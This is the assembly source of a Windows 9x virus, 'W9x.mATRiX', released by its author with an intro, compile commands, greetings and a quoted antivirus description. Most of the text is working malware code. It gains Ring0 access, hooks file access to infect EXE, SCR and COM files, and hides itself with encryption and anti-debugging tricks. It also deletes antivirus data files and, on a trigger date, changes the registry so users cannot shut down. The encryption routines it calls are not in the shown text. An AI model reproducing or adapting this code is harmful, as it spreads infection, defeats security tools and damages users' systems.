comment                                                                           ˇ

released

˙ ƒÕƒÕÕÕÕƒÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕƒ˙ƒÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕƒÕÕÕƒÕƒ ˙
             ‹‹‹‹‹                                           ∞
    €€€€   ∞  ﬂﬂﬂﬂ €€€€ﬂ€€€ €€€€ﬂ€€€€ €€€€   €€€€˛ﬂﬂﬂﬂ €€€€ﬂ€€€€ €€€€ﬂ€€€€2000
  ∞ ≤€€€ ∞    €€€€ ≤€€€‹  ∞ €€€€˛     €€€€ ∞ ≤€€€ €€€€ €€€€  ∞   ≤€€€˛     ∞
∞∞∞∞≤€€€∞€€€€∞≤€€€∞€€€€∞∞∞∞∞€€€€∞€€€€∞≤€€€∞€∞€€€€∞≤€€€∞≤€€€∞∞∞∞∞∞≤€€€∞€€€€∞ ∞∞
  ∞ ≤€€€‹€€€€‹≤€€€ ≤€€€  ∞  ≤€€€‹€€€€ ≤€€€‹€‹€€€€ ≤≤€€‹≤€€€  ∞  ∞≤€€€‹€€€€[LW]
                ﬂﬂﬂﬂﬂﬂﬂ                                             ∞
        W9x.mATRiX.size by LiFEwiRE [ShadowVX] - www.shadowvx.org


        Intro

        This virus is my first windows virus, and the result of reading some
        docs, tutorial and (Ring0 virus)-sources.

        It is not a very complicated virus, and it doesn't use new technics
        too... Maybe the ASCII counter is some unusual feature.

        When debugging is enabled, this things are extra:

        Unload when dword at bff70400 <> 0h
        Beep at certain events (get resident, unload & infect)
        Beep can be turned off by changing byte ptr at bff70408 <> 0h
        only infects files at your D: drive (it's my test drive)

        I use WinIce to modify the values.

        Specs:

        Ring0 resident, infects on IFSmgr file rename, open and attrib, EXE,
        SCR and COM (!) files. Com files are infected for the payload, a scene
        from The Matrix. The COM files are not really infected, but some date
        checking code and action is appended on it. When the month is equal
        to the date the payload will start.

        Infection  : Increasing last section, and make a jump at orignal
                     entrypoint to it (when modifying EP to last section
                     AVPM will popup:( )

        Encryption : XOR'd and polymorfic-build-up-decryptors.
        Armour     : Anti debugger & anti emulator (SEH & Anti-SoftICE)

        Payload(s) : 2, as i said above 1 which is appended to all .com files
                     on opening and c:\windows\win.com which will display
                     'Wake up Neo... / The Matrix has you... / w9x.mATRiX'
                     like in the movie (except the last sentence, w9x.mATRiX:)
                     when the day is equal to the month (1 jan, 2 feb,etc.)

                     the other payload will remove the shutdown command from
                     the start menu using the registery - at 06 april.

        KnownBugs :  No I know... I tested this code a lot, and a friend of me
                  :  infected his own PC accidently and it worked really good
                     :)... The only problem is that F-prot hangs on infected
                     files... hehe but that's not my problem :)

        Thanx  to : Lord Julus, Billy Belcebu & Z0MBiE.

        Greets to : Ruzz', Kamaileon, z3r0, Bhunji, Dageshi, all other Shadow-
                    VX members,                        
                    r-, GigaByte, VirusBuster, CyberYoda, T00fic, all other
                    people i met on #virus & #vir, and 29A & iKX for their
                    nice magazines.

                    and some non-virus greets:

                    Ghostie :P, Hampy, nog wat XXXClan'ers, DJ Accelerator,
                    King Smozzeboss SMOS from Conehead SMOS games [NL1SMS]
                    PiepPiep, NL0JBL, BlueLIVE, MisterE & Xistence.

        Compile:    Tasm32 /m3 /ml LiFEwiRE.ASM,
                    tlink32 /Tpe /aa /c LiFEwiRE.OBJ,,,import32.lib
                    pewrsec LiFEwiRE.EXE

        Contact:    Lifewire@mail.ru


˙ƒÕƒÕÕÕÕƒÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕƒ˙ƒÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕƒÕÕÕƒÕƒ ˙   ˇ

Description at www.viruslist.com

Win95.Matrix


It is not a dangerous memory resident polymorphic parasitic Win9x virus. It
stays in the Windows memory as a device driver (VxD) by switching from
application mode to Windows kernel (Ring3->Ring0), hooks disk files access
functions, and infect PE executable files with EXE and SCR file name
extensions, and affects DOS COM files.

While infecting a PE EXE file the virus encrypts itself and writes to the
file end. The virus also patches program's startup code with a short routine
that passes control to main virus code.

While affecting DOS COM files the virus writes to the end of file a short
routine that has no infection abilities, but just displays a message on
July 7th:

 Wake up, Neo...
 The Matrix has you...
 w9x.mATRiX

The virus also affects the C:\WINDOWS\WIN.COM file in the same way.

On April 6th the virus modifies the system registry key:

HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer NoClose = 1

As the result of this key a user cannot switch off the computer.

The virus also deletes anti-virus data files: AVP.CRC, ANTI-VIR.DAT, IVB.NTZ,
CHKLIST.MS.

The virus contains the text strings:

[- comment from LiFEwiRE- AV'ers forgot to put the strings here??]

where 'xxxxxxx' is the virus' "generation" number.


˙ƒÕƒÕÕÕÕƒÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕƒ˙ƒÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕƒÕÕÕƒÕƒ ˙   ˇ

.486p
.model flat
locals
jumps

        extrn ExitProcess:PROC;                 ;only 4 first gen.

;----- -[Equ's]- ------------------------------------------------------------;

debug           equ     1                       ;test/debug version?

virusz          equ     offset end - offset start
sectionflags    equ     00000020h or 80000000h or 20000000h

if debug eq 1
inthook         equ     05h                     ;let's hook this int for ring0
 else
inthook         equ     03h                     ;let's hook this int for ring0
 endif
 
JmpToCodesz     equ     offset EndJmpToCode-offset JmpToCode

IFSMgr                   equ     0040h          ;for VxDCall
InstallFileSystemApiHook equ     067h           ;used in ring0 hooker
UniToBCSPath             equ     041h           ;used in hook to convert uni2ansi
Ring0_FileIO             equ     032h           ;for all file i/o

IFSFN_FILEATTRIB         equ     21h            ;hooked functions
IFSFN_OPEN               equ     24h
IFSFN_RENAME             equ     25h

R0_OPENCREATFILE         equ     0D500h         ;used with ring0_fileIO
R0_CLOSEFILE             equ     0D700h
R0_WRITEFILE             equ     0D601h
R0_READFILE              equ     0D600h
R0_GETFILESIZE           equ     0D800h
R0_FILEATTRIBUTES        equ     04300h
GET_ATTRIBUTES           equ     00h
SET_ATTRIBUTES           equ     01h
R0_DELETEFILE            equ     04100h

PC_STATIC                equ     20000000h      ;for allocating pages
PC_WRITEABLE             equ     00020000h      ;and protecting them from
PC_USER                  equ     00040000h      ;ring3 code
PAGEZEROINIT             equ     00000001h
PAGEFIXED                equ     00000008h
PG_SYS                   equ     1

Get_DDB                  equ     0146h          ;VMMCall to find S-ICE

PageAllocate             equ     0053h
PageModifyPermissions    equ     0133h

SizeInPages              equ     (virusz+1000 + 4095) / 4096


RegOpenKey               equ     0148h          ;used by payload for registery
RegSetValueEx            equ     0152h          ;modifying
HKEY_CURRENT_USER        equ     80000001h      ;
REG_DWORD                equ     4              ;


debug_beep_FREQ          equ     1700           ;for debugging
debug_beep_DELAY         equ     50*65536

debug_beep_FREQ2         equ     700           ;for debugging
debug_beep_DELAY2        equ     100*65536

;----- -[Macro's]- ----------------------------------------------------------;

VxDCall macro   vxd_id, service_id
        int     20h
        dw      service_id
        dw      vxd_id
        endm

VMMCall macro   service_id                      ;Is just less work than doing
        int     20h                             ;a VxDCall VMM, service
        dw      service_id
        dw      0001h
        endm

if debug eq 1
;        display "Debug Version"
        else
        display " ∞±≤€ *Warning* This is the real version of the virus €≤±∞"
endif

;----- -[Code]- -------------------------------------------------------------;
_CODE   segment dword use32 public 'CODE'

start:
        pushad

        call    getdelta
getdelta:
        pop     ebp
        sub     ebp,offset getdelta

        sub     eax,00001000h                   ;Get imagebase at runtime
newEIP  equ     $-4

        mov     dword ptr [imagebase+ebp],eax

        pushad

        call    setupSEHandKillEmu              ;The call pushes the offset

        mov     esp,[esp+8]                     ;Error gives us old ESP                          
        jmp     backtocode

setupSEHandKillEmu:
        xor     edx,edx                         ;fs:[edx] = smaller then fs:[0]
        push    dword ptr fs:[edx]              ;Push original SEH handler
        mov     fs:[edx],esp                    ;And put the new one (located
        dec     byte ptr cs:[edx]               ;make error & let our SEH take
                                                ;control (not nice 4 emu's:)
backtocode:

        pop     dword ptr fs:[0]
        pop     edx                             ;pops EIP pushed by call setupSEH

        popad

        call    SetupSEH                        ;to kill errors

        ;if eip gets here an error has occured        

        mov     esp,[esp+8]                     ;contains old ESP

        jmp     RestoreSEH                      ;...

SetupSEH:
        xor     edx,edx                         ;we are save now, if an error
        push    dword ptr fs:[edx]              ;occure EIP will be at the
        mov     fs:[edx],esp                    ;code after SetupSEH

        push    edx
        sidt    fword ptr [esp-2]               ;'push' int table
        pop     edx                             ;restore stack from call and
                                                ;edx contains pointer to IDT

        add     edx,(inthook*8)+4               ;Get int vector

        mov     ebx,dword ptr [edx]
        mov     bx,word ptr [edx-4]             

        lea     edi,dword ptr [ebp+Inthandler]  ;routine to let int point to

        mov     word ptr [edx-4],di
        shr     edi,16                          ;high/low word
        mov     word ptr [edx+2],di

        int     inthook                         ;call int, int will be ring0!

        mov     word ptr [edx-4],bx             ;Restore old interrupt values
        shr     ebx,16
        mov     word ptr [edx+2],bx


RestoreSEH:

        xor     edx,edx
        pop     dword ptr fs:[edx]
        pop     edx                             ;pops offset pushed by CALL

        mov     edi,dword ptr [imagebase+ebp]   ;--- Restore old bytes ---;
        add     edi,dword ptr [base+ebp]        ;do at it ring0 to avoid
                                                ;page errorz
        lea     esi,[offset oldbytes+ebp]
        mov     ecx,JmpToCodesz
        rep     movsb                           ;restore bytes from host

        popad
        
        mov     eax,00h                         ;--- return to host ---;
imagebase       equ     $-4
        add     eax,offset host -0400000h       ;1st gen
base    equ     $-4

        push    eax
        ret

;----------------------------------------------------------------------------;
;       ****    RING0 LOADER    ****
;----------------------------------------------------------------------------;
Inthandler:
        pushad

        mov     eax,0bff70404h                  ;already loaded?
        cmp     dword ptr [eax],eax
        je      back2ring3
        mov     dword ptr [eax],eax

        push    PAGEFIXED + PAGEZEROINIT
        xor     eax, eax
        push    eax                             ;PhysAddr
        push    eax                             ;maxPhys
        push    eax                             ;minPhys
        push    eax                             ;Align
        push    eax                             ;handle of VM = 0 if PG_SYS
        push    PG_SYS                          ;allocate memory in system area
        push    SizeInPages*2                   ;nPages
VxD1V   equ     00010053h
VxD1:   VMMCall PageAllocate
        add     esp, 8*4

        or      eax,eax                         ;eax = place in mem
        jz      back2ring3                      ;if zero error :(

        mov     edi,eax                         ;set (e)destination

        push    eax

        push    edi
        lea     esi,[offset start+ebp]          ;set source
        mov     ecx,virusz                      ;virussize
        cld                                     ;you never know with poly :)
rep     movsb                                   ;copy virus to allocated mem
        pop     edi

        mov     dword ptr [edi+delta-start],edi

        lea     ecx,[edi+offset hook-offset start]           ;Install FileSystem Hook
        push    ecx
VxD2V   equ     InstallFileSystemApiHook+256*256*IFSMgr
VxD2:   VxDCall IFSMgr,InstallFileSystemApiHook
        pop     ecx

        mov     [edi+nexthook-start],eax

        pop     eax
        
        push    PC_STATIC                             
        push    020060000h                      ;new paging settings
        push    SizeInPages*2
        shr     eax, 12
        push    eax
VxD5V   equ     00010133h
VxD5:   VMMCall PageModifyPermissions
        add     esp, 4*4


        call    CheckThePayloadDate             ;(and mayB do something:)

if debug eq 1
        call    debug_beep2
endif

back2ring3:

if debug eq 1
        call    debug_beep
endif

        popad
        iretd                                   ;exit int (to ring3!)
;----------------------------------------------------------------------------;

host:
oldbytes:
        Push    0
        Call    ExitProcess
        db      JmpToCodesz-5 dup (176d)

;----------------------------------------------------------------------------;
;       ****    FILESYSTEM HOOK  ****
;----------------------------------------------------------------------------;

hook:
	push	ebp
	mov	ebp,esp

	sub	esp,20h

	push	ebx
	push	esi
	push	edi

        db      0bfh                            ;mov edi,DeltaInMem
delta   dd      0

        cmp     dword ptr [busy-start+edi],not "BuSY"     ;...are we busy?
        je      back

if debug eq 1
        cmp     dword ptr [death-start+edi],'TRUE'
        je      back
endif

        mov     eax,dword ptr [ebp+0Ch]         ;EAX = Function
        not     eax

        cmp     eax,not IFSFN_OPEN              ;File Open? try it
        jz      infect

        cmp     eax,not IFSFN_RENAME            ;Rename? try it
        jz      infect

        cmp     eax,not IFSFN_FILEATTRIB        ;File Attributes? try it
        jz      infect

back:
        mov     eax,[ebp+28]         ; call the old
	push	eax
	mov	eax,[ebp+24]
	push	eax
	mov	eax,[ebp+20]
	push	eax
	mov	eax,[ebp+16]
	push	eax
	mov	eax,[ebp+12]
	push	eax
	mov	eax,[ebp+8]
	push	eax

	db	0b8h
nexthook dd 0
	call	[eax]

	add	esp,6*4

	pop	edi
	pop	esi
	pop	ebx

	leave
	ret
        
;----------------------------------------------------------------------------;
;       ****    SOME CHECKS BEFORE INFECTING    ****
;----------------------------------------------------------------------------;

infect:
        pushad

if debug eq 1
        mov     eax,0bff70400h
        mov     eax,dword ptr [eax]
        or      eax,eax
        jz      stayalive                       ;kill ourself?

        mov     dword ptr [edi+death-start],'TRUE'

        call    debug_beep
        call    debug_beep2
        call    debug_beep2
        call    debug_beep2
        call    debug_beep

        mov     eax,0bff70400h

        xor     edx,edx
        mov     dword ptr [eax],edx
        mov     dword ptr [eax+4],edx

stayalive:

endif

        mov     dword ptr [busy-start+edi],not 'BuSY'

        lea     esi, [edi+filename-start]       ;file buffer

        mov     eax, dword ptr [ebp+16]
        cmp     al,0ffh                         ;no drive defined?
        je      nopath
        add     al,40h                          ;a=1,b=2,a+40h='A',b+40h='B'
        mov     byte ptr [esi],al
        mov     word ptr [esi+1],':'
        add     esi,2
nopath:
        xor     eax,eax
        push    eax   ;push 0                   ;BCS/WANSI
        inc     ah                              ;ax=100h
        push    eax   ;push 100h                ;buf size
        mov     eax,[ebp+28]
        mov     eax,[eax+12]
        add     eax,4
        push    eax                             ;filename
        push    esi                             ;destination (buffer)

VxD3V   equ     UniToBCSPath+256*256*IFSMgr
VxD3:   VxDCall IFSMgr, UniToBCSPath            ;Convert to ASCII

        add     esp,4*4                         ;restore stack
        add     esi,eax                         ;eax = lenght
        mov     byte ptr [esi],0                ;make ASCIIZ

        mov     eax,dword ptr [esi-4]

        not     eax                             ;
        cmp     eax,not 'EXE.'                  ;normal exe?
        je      infectit

        cmp     eax,not 'RCS.'                  ;screensaver?
        je      infectit

        cmp     eax,not 'MOC.'                  ;a com? (indeed !!:)
        jne     nocomfile 
        jmp     payloadinfector
nocomfile:

quitinfect:

        mov     dword ptr [busy-start+edi],eax  ;hope eax <> 'busy' :)
        popad

        jmp     back

db      "<w9x.mATRiX."
db      virusz/1000 mod 10+'0'
db      virusz/0100 mod 10+'0'
db      virusz/0010 mod 10+'0'
db      virusz/0001 mod 10+'0',"."
counter db      "0001086 & MyLittlePoly."       ;enough space for counter :)
db      polysz/1000 mod 10+'0'
db      polysz/0100 mod 10+'0'
db      polysz/0010 mod 10+'0'
db      polysz/0001 mod 10+'0'

if debug eq 1
db      " Debug Version"
endif

db      " by LiFEwiRE [sHAD0WvX]>"



dontinfect:     ;when attrs. were already modified
        pop     esi                             ;get attribs + 1 = set
        pop     ecx                             ;old attrs
        pop     eax                             ;pointer to buffer with filen.
        call    R0_FileIO                       ;RESTORE ATTRIBUTES
        jmp     quitinfect


cryptkey        dd      0
cryptkey2       dw      0

;----------------------------------------------------------------------------;
;       ****    REAL PE INFECTION PART  ****
;----------------------------------------------------------------------------;

infectit:

        lea     esi, [edi+filename-start]

        call    checkname
        jc      quitinfect                      ;if name = bad

if debug eq 1
        cmp     word ptr [esi],":D"
        jne     quitinfect
endif

        mov     eax,R0_FILEATTRIBUTES + GET_ATTRIBUTES
        push    eax
        call    R0_FileIO

        pop     eax
        inc     eax                             ;eax=4300+1 = set
        push    eax
        push    ecx                             ;save attribs
        push    esi                             ;and esi,no new LEA needed
        xor     ecx,ecx                         ;new attr
        call    R0_FileIO
        
        xor     ecx,ecx                         ;ecx=0
        mov     edx,ecx                         ;
        inc     edx                             ;edx=1
        mov     ebx,edx                         ;
        inc     ebx                             ;ebx=2
        mov     eax,R0_OPENCREATFILE
        call    R0_FileIO
        jc      dontinfect

        mov     ebx,eax                         ;file handle

        lea     esi,[edi+pointertope-start]     ;read pointer to PE at 3ch
        mov     ecx,4                           ;into pointertope
        mov     edx,03ch
        mov     eax,R0_READFILE
        call    R0_FileIO

        lea     esi,[edi+peheader-start]        ;peheader buffer
        mov     ecx,1024                        ;1024 bytes
        mov     edx,dword ptr [edi+pointertope-start] ;pointer to pe header
        mov     eax,R0_READFILE                 ;...
        call    R0_FileIO

        cmp     word ptr [esi],'EP'             ;is pe?
        jne     nope                            ;nope, its noPE :)

        mov     eax,0badc0deh                   ;already infected?
        cmp     dword ptr [esi+4ch],eax         ;4ch = reserved
        je      nope
        mov     dword ptr [esi+4ch],eax

        push    ebp
        push    edi
        push    ebx                             ;save handle for after calcs.

        mov     ebp,edi

        mov     edi,esi
        add     esi,18h                         ;esi+18h=start of OptionalHeader
        add     si,word ptr [esi+14h-18h]       ;esi-4 = pe/0/0+14h = size OH
                                                ;optionalheader+size=allocation table

        ;edi = PE/0/0, esi = allocation table

        push    esi
        xor     ecx,ecx
        mov     cx,word ptr [edi+6]             ;put in ecx nr. of sections
        xor     eax,eax                         ;startvalue of eax
        push    cx                              ;
sectionsearch:
        cmp     dword ptr [esi+14h],eax         ;is it the highest?
        jb      lower                           ;no
        mov     ebx,ecx                         ;remember section nr.
        mov     eax,dword ptr [esi+14h]         ;and remember value
lower:
        add     esi,28h                         ;steps of 28h
        loop    sectionsearch
        pop     cx

        sub     ecx,ebx

        mov     eax,28h                         ;multiply with section length
        mul     ecx
        pop     esi
        add     esi,eax                         ;esi points now to section header

;    Section header layout, Tdump names things other (4 example rawdata)
;
;esi+0h      8h      Section's name (.reloc, .idata, .LiFEwiRE)
;    8h      4h      VirtualSize
;    0ch     4h      RelativeVirtualAdress
;    10h     4h      SizeOfRawData
;    14h     4h      PointerToRawData
;    18h     4h      PointerToRelocations
;    1ch     4h      PointerToLinenumbers
;    20h     2h      NumberOfRelocations
;    22h     2h      NumberOfLinenumbers
;    24h     4h      Characteristics


;       ESI points to Section header, EDI points to PE

        or      [esi+24h],sectionflags          ; Update section's flagz

        mov     edx,[esi+10h]                   ; EDX = SizeOfRawData
        mov     eax,edx                         ; EAX = SizeOfRawData
        add     edx,[esi+0Ch]                   ; EDX = New EIP
        add     eax,[esi+14h]                   ; EAX = Where append virus
        push    eax                             ; Save it

        push    esi

        add     eax,[esi+0Ch]
        mov     [edi+50h],eax

        mov     eax,[edi+28h]                           ;backup entry RVA
        mov     dword ptr [ebp+base-start],eax          ;...
        mov     dword ptr [ebp+newEIP-start],edx        ;save it

        add     edx,dword ptr [edi+34h]         ;edx=neweip+imagebase

        mov     dword ptr [ebp+distance-start],edx  ; Store the address

        mov     esi,edi
        add     esi,18h                         ;esi+18h=start of OptionalHeader
        add     si,word ptr [esi+14h-18h]       ;esi-4 = pe/0/0+14h = size OH

        ;ESI points to the allocation table,EDI to PE

        ;lets find the section which contains the RVA.

        ;then the place where to put the jump is entry-rva+phys.

        sub     esi,28h


look:   add     esi,28h
        mov     edx,eax                         ;Old EntryPoint (RVA)
        sub     edx,dword ptr [esi+0Ch]         ;VirtualAddres
        cmp     edx,dword ptr [esi+08h]         ;VirtualSize
        jae     look 

        sub     eax,dword ptr [esi+0ch]         ;sub RVA
        add     eax,dword ptr [esi+14h]         ;add PhysicalOffset
                                                ;EAX is now the PhysicalOffset
                                                ;of the EntryPoint

        or      [esi+24h],sectionflags          ; Update section's flagz

        pop     esi
        pop     edx
        pop     ebx

        push    edx                             ;
        push    esi
        push    eax

        lea     esi,[ebp+oldbytes-start]        ;read pointer to PE at 3ch
        mov     ecx,JmpToCodesz                 ;into pointertope
        mov     edx,eax
        mov     eax,R0_READFILE
        call    R0_FileIO

        mov     word ptr [ebp+randombla-start],ax       ;random value

        pop     edx                             ;and write new bytes at entry
        lea     esi,[ebp+JmpToCode-start]       ;point to make code jmp to
        mov     eax,R0_WRITEFILE                ;the section which contains
        mov     ecx,JmpToCodesz                 ;the viruscode (modifying the
        call    R0_FileIO                       ;entry RVA will alert AV's)

        call    VxDPatch                        ;unpatch VxDCalls (and VMM)

        call    IncCounter                      ;a ASCII counter rules

        call    encrypt                         ;encrypt,createpoly,returnsize (in ecx)
                 
        ;encrypt-^ returns the virus size in ecx

        mov     eax,ecx
        mov     ecx,[edi+3Ch]                   ;ECX = Alignment
        push    edx                             ; Align
        xor     edx,edx
        push    eax
        div     ecx
        pop     eax
        sub     ecx,edx
        add     eax,ecx
        pop     edx
        mov     ecx,eax                         ;aligned size to append

        pop     esi

        add     [esi+10h],eax                   ; Size of rawdata
        mov     eax,[esi+10h]                   ; 
        add     [esi+08h],eax                   ; & virtual size

        pop     edx
        push    edi
        lea     esi,[ebp+viruscopy-start]       ;polymorfer returns size in 
        mov     eax,R0_WRITEFILE                ;the ECX register
        push    eax
        call    R0_FileIO                       ;append virus

        pop     eax
        pop     esi
        mov     ecx,1024
        mov     edx,[ebp+pointertope-start]
        call    R0_FileIO                       ;overwrite PE header


        pop     edi
        pop     ebp

nope:
        mov     eax,R0_CLOSEFILE
        call    R0_FileIO

if debug eq 1
        call    debug_beep
endif

        call    killAVfiles
        call    infectwindotcom                 ;for payload

        jmp     dontinfect

windotcom       db      "C:\WINDOWS\WIN.COM",0h                 ;for payload
sizewdc         equ     $-offset windotcom

avpcrc          db      9,"AVP.CRC",0h
antivirdat      db      14,"ANTI-VIR.DAT",0h
ivbntz          db      9,"IVB.NTZ",0h
chklistms       db      12,"CHKLIST.MS",0h

killAVfiles:
        pushad
                                ;first add the path to the filename
        mov     ebp,edi

        lea     edx,[offset avpcrc-start+ebp]

        mov     ecx,4
killing:
        call    killthisfile
        xor     ebx,ebx
        mov     bl,byte ptr [edx]
        add     edx,ebx
        loop    killing

        popad

        ret


killthisfile:
        pushad
        lea     edi,[offset filename-start+ebp]
        push    edi

        mov     al,'.'
        cld
        scasb           ;search from left to right for the dot
        jne     $-1

        std
        mov     al,'\'  ;search from right to left for the \
        scasb
        jne     $-1

        xor     ecx,ecx

        inc     edi     ;edi pointed to char before \
        inc     edi     ;edi pointed to \

        cld
        
        mov     esi,edx
        lodsb
        mov     cl,al
rep     movsb

        pop     esi
        mov     eax,R0_DELETEFILE
        mov     ecx,2027h
        call    R0_FileIO
        popad
        ret

;--------------------------------------------------------------------------
;       ****    MODIFIES COM FILES FOR PAYLOAD, SPECIAL FOR WIN.COM     ***
;--------------------------------------------------------------------------

infectwindotcomflag     db      0h

infectwindotcom:                                ;called if virus is not resident
        pushad
        mov     byte ptr [edi+offset infectwindotcomflag-start],'!'

        push    edi

        lea     esi,[offset windotcom-start+edi]
        lea     edi,[offset filename-start+edi]
        mov     ecx,sizewdc
        cld
rep     movsb

        pop     edi

        jmp     payloadinfector

backfrominfecting:

        mov     byte ptr [edi+offset infectwindotcomflag-start],173d ;≠
        popad            
        ret

;--------------------------------------------------------------------------

jmpop   dw      0e990h                          ;nop & jmp
jmpval  dw      ?


;--------------------------------------------------------------------------

payloadinfector:
if debug eq 1
        cmp     dword ptr [esi-8],'PRUB'        ;*BURP.COM ?
        jne     wegvancom
endif

        lea     esi, [edi+filename-start]
        
        xor     ecx,ecx                         ;ecx=0
        mov     edx,ecx                         ;
        inc     edx                             ;edx=1
        mov     ebx,edx                         ;
        inc     ebx                             ;ebx=2
        mov     eax,R0_OPENCREATFILE
        call    R0_FileIO
        jc      wegvancom

        mov     ebx,eax                         ;file handle

        lea     esi,[edi+first4bts-start]       ;read first 4 bytes
        mov     ecx,4
        xor     edx,edx
        mov     eax,R0_READFILE
        call    R0_FileIO

        cmp     word ptr [edi+first4bts-start],'ZM'     ;a renamed EXE ??
        je      closecomfile

        cmp     word ptr [edi+first4bts-start],0e990h   ;already infected?
        je      closecomfile
        
        mov     eax,R0_GETFILESIZE
        call    R0_FileIO                       ;get it's size

        cmp     eax,0ffffh-0100h-dospayloadsize ;infectable?
        ja      closecomfile

        push    eax

        sub     eax,4
        mov     word ptr [edi+jmpval-start],ax    ;distance to jmp

        lea     esi,[edi+offset jmpop-start]    ;Write new jMP at 0h
        mov     eax,R0_WRITEFILE
        mov     ecx,4
        xor     edx,edx
        push    eax
        call    R0_FileIO

        pop     eax
        pop     edx                             ;place to append
        push    edx
        lea     esi,[edi+offset dospayload-start]
        mov     ecx,dospayloadsize
        call    R0_FileIO

        pop     edx                          ;read 7 bytes before the end
        push    edx
        sub     edx,7
        mov     ecx,7
        mov     eax,R0_READFILE
        lea     esi,[edi+offset filename-start] ;just a buffer
        call    R0_FileIO

        pop     edx

        cmp     word ptr [edi+offset filename-start+3],'SN' ;ENUNS? (ENU is
        jne     closecomfile                                ;optional)

        add     word ptr [edi+offset filename-start+5],dospayloadsize+7

        mov     ecx,7

        lea     esi,[edi+offset filename-start]
        mov     eax,R0_WRITEFILE
        add     edx,dospayloadsize
        call    R0_FileIO                       ;append updated ENUNS 

closecomfile:
        mov     eax,R0_CLOSEFILE
        call    R0_FileIO

wegvancom:

if debug eq 1
        call    debug_beep
endif

        cmp     byte ptr [edi+offset infectwindotcomflag-start],'!'
        je      backfrominfecting

        jmp     quitinfect

;--------------------------------------------------------------------------



;--------------------------------------------------------------------------
;       ***     BEEPS used if debug equ 1                               ***
;--------------------------------------------------------------------------


if debug eq 1
debug_beep:
        push    eax
        push    ecx        

        mov     eax,0bff70408h
        cmp     byte ptr [eax],0
        jne     geenirritantgebiepvandaag

        mov     al, 0B6h
        out     43h, al

        mov     al, (12345678h/debug_beep_FREQ) and 255
        out     42h, al
        mov     al, ((12345678h/debug_beep_FREQ) shr 16) and 255
        out     42h, al

        in      al, 61h
        or      al, 3
        out     61h, al

        mov     ecx, debug_beep_DELAY
        loop    $

        in      al, 61h
        and     al, not 3
        out     61h, al

        pop     ecx
        pop     eax
        ret

debug_beep2:
        push    eax
        push    ecx        

        mov     al, 0B6h
        out     43h, al

        mov     al, (12345678h/debug_beep_FREQ2) and 255
        out     42h, al
        mov     al, ((12345678h/debug_beep_FREQ2) shr 16) and 255
        out     42h, al

        in      al, 61h
        or      al, 3
        out     61h, al

        mov     ecx, debug_beep_DELAY2
        loop    $

        in      al, 61h
        and     al, not 3
        out     61h, al

geenirritantgebiepvandaag:      ;blaa dit versta jij toch niet looser :P

        pop     ecx
        pop     eax
        ret
endif


;--------------------------------------------------------------------------
;       File IO function, called lot of times, better for patching callback
;--------------------------------------------------------------------------

R0_FileIO:
VxD4V   equ     Ring0_FileIO+256*256*IFSMgr
VxD4:   VxDCall IFSMgr, Ring0_FileIO
        ret

;--------------------------------------------------------------------------



;--------------------------------------------------------------------------
;       Increases the ASCII counter of infections
;--------------------------------------------------------------------------

IncCounter:             ;counts a ASCII counter... when there are more than
                        ;9999999 files infected it contains a bug, but i don't
        lea     esi,[offset counter-start+6+ebp] ;expect that from this vir :)

next:
        inc     byte ptr [esi]
        cmp     byte ptr [esi],'9'+1
        jb      ok
        mov     byte ptr [esi],'0'        
        dec     esi
        jmp     next
ok:
        ret


;--------------------------------------------------------------------------

;------------------------------------------------------------------------------
;       Some things used in the registery payload
;------------------------------------------------------------------------------

KeyOfPolicies   db      "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",0h
valuename1      db      "NoClose",0h            ;no shutdown :)
ValueToSet      dd      1h


CheckThePayloadDate:

        mov     al,07h                          ;Get day
        out     70h,al                          ;(returns it in hex btw!)
        in      al,71h

        cmp     al,06h                          ;Is it 6th?
        jnz     noPayload
        
        mov     al,08h                          ;Get month
        out     70h,al                          ;(returns it in hex btw!)
        in      al,71h

        cmp     al,04h                          ;Is it 4th?
        jnz     noPayload                       ;(

        lea     eax,[offset pointertope+ebp]    ;just a buffer
        push    eax
        lea     eax,[offset KeyOfPolicies+ebp]  ;open this key
        push    eax
        push    HKEY_CURRENT_USER               ;
VxD6V   equ     RegOpenKey+256*256*1
VxD6:   VMMCall RegOpenKey
                                                
        add     esp,3*4                         ;reset stackpointer

        push    4                               ;length of value
        lea     eax,[offset ValueToSet+ebp]     ;set value true
        push    eax
        push    REG_DWORD                       ;type
        push    0                               ;reserved
        lea     eax,[offset valuename1+ebp]
        push    eax
        push    [pointertope+ebp]               ;handle
VxD7V   equ     RegSetValueEx+256*256*1         ;1 = VMM
VxD7:   VMMCall RegSetValueEx

        add     esp,6*4

noPayload:
        ret


;--------------------------------------------------------------------------


;--------------------------------------------------------------------------
;       Patches the VxDCalls (on execute windows modifies them to a real call)
;--------------------------------------------------------------------------

VxDPatch:
        pushad
        mov     bx,020cdh       ;int 20 used by VxDCall

        mov     word ptr [VxD1-start+ebp],bx            ;int 20
        mov     dword ptr [VxD1-start+ebp+2],VxD1V      ;dd with IFSMGR & fn.

        mov     word ptr [VxD2-start+ebp],bx
        mov     dword ptr [VxD2-start+ebp+2],VxD2V

        mov     word ptr [VxD3-start+ebp],bx
        mov     dword ptr [VxD3-start+ebp+2],VxD3V

        mov     word ptr [VxD4-start+ebp],bx
        mov     dword ptr [VxD4-start+ebp+2],VxD4V

        mov     word ptr [VxD5-start+ebp],bx
        mov     dword ptr [VxD5-start+ebp+2],VxD5V
        
        mov     word ptr [VxD6-start+ebp],bx
        mov     dword ptr [VxD6-start+ebp+2],VxD6V
        
        mov     word ptr [VxD7-start+ebp],bx
        mov     dword ptr [VxD7-start+ebp+2],VxD7V
        
        popad
        ret

;--------------------------------------------------------------------------


rnd32_seed      dd      0h


;------ this code is putted at EIP of host and jmps to virus code -----------;
JmpToCode:
        stc
        db      066h,0fh,083h           ;jnc 
randombla       dw      ?               ;some place
        mov     eax,12345678h
distance        equ $-4
        push    eax
        ret
EndJmpToCode:
;----------------------------------------------------------------------------;

